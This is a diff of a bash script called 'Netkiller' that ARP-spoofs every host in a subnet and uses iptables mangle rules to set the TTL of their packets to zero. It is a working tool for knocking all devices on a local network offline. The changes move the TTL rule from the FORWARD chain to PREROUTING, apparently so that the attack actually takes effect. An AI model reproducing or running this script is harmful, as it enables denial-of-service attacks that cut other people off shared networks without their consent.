@@ -102,7 +102,7 @@ echo " "
 echo "Netkiller is stopped!"
 echo " "
 ip -s -s neigh flush all >/dev/null 2>&1
-iptables -t mangle -F FORWARD 
+iptables -t mangle -F PREROUTING
 iptables -P FORWARD ACCEPT
 iptables -F FORWARD
 pkill -f arpspoof
@@ -137,10 +137,9 @@ if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
     for ((i=START; i<=END; i++)); do
         TARGET_IP=$(int2ip "$i")
         ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
-          iptables -t mangle -I FORWARD -d "$TARGET_IP" -j TTL --ttl-set 0
+          iptables -t mangle -I PREROUTING -s "$TARGET_IP" -j TTL --ttl-set 0
     done
 fi
-
 echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
 echo ""
 echo "To stop, Type: sudo netkiller-stop"
